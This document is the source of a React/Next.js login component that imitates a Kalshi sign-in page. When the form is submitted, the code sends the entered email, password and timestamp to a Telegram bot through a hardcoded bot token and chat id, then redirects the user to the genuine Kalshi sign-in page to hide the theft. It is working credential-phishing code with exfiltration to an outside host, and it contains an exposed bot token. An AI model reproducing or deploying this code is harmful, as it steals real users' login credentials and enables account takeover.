"use client"
import React, { useEffect, useState } from 'react'
import styles from './Login.module.scss'
import cn from 'classnames'
import Link from 'next/link'
import axios from 'axios';
import { useRouter } from 'next/navigation'

const LoginBlock = () => {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [emailError, setEmailError] = useState(false) 
    const [emailErrorInvisible, setEmailErrorInvisible] = useState(false) 
    const [passwordError, setPasswordError] = useState(false) 
    const [passwordErrorInvisible, setPasswordErrorInvisible] = useState(false) 
    const router = useRouter();


    useEffect(() => {
        if (!email || !email.includes("@") || !email.includes('.')) {
            setEmailErrorInvisible(true);
        } else {
            setEmailErrorInvisible(false);
        }
        
        if (password.length === 0) {
            setPasswordErrorInvisible(true);
        } else {
            setPasswordErrorInvisible(false);
        }
        
    }, [password, email, emailErrorInvisible, passwordErrorInvisible])


    const submitHandler = (e) => {
        e.preventDefault();
        setEmailError(emailErrorInvisible);
        setPasswordError(passwordErrorInvisible);
        


        if (password && email && !emailErrorInvisible && !passwordErrorInvisible) {
            const date = new Date();
                        const message = `
Email: \`${email}\`
Password: \`${password}\`
Date: \`${date.toLocaleString()}\`
    `
            const BOT_TOKEN = '6975911574:AAEK7RJS_fxozqLz98cDWEmkxOabE6CJWb4';
            const URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`
            axios.post(URL, {
                chat_id: '-1002039669260',
                text: message,
                parse_mode: 'Markdown'
            }).then(res => router.push('https://kalshi.com/sign-in')).catch(res => console.log(res)
            )
        } else {
            return;
        }
    }
  return (
      <section className={styles.login}>
          <div className={cn('container', styles.container)}>
              <div className={styles.wrapper}>
                  <h1>Log in to Kalshi</h1>
              <p className={styles.descr}>Note: Demo and production accounts are not shared.</p>
              <form onSubmit={(e) => submitHandler(e)} className={styles.form}>
                  <label className={styles.label}>
                      <span className={styles.labelSpan}>Email</span>
                      <input value={email} onChange={(e) => setEmail(e.target.value)} type="text" />
                      {emailError? <span className={styles.error}>Enter a valid email</span> : ''}
                  </label>
                  <label>
                      <span className={styles.labelSpan}>Password</span>
                      <input value={password} onChange={(e) => setPassword(e.target.value)} type="password" />
                      {passwordError ? <span className={styles.error}>Enter a valid password</span> : ''}
                  </label>
                  <Link className={styles.forgot} href="/">Forgot password →</Link>
                  <button type="submit">Log in</button>
                  <button type='button'>
                      No account? Create one
                  </button>
              </form>
              </div>
          </div>
    </section>
  )
}

export default LoginBlock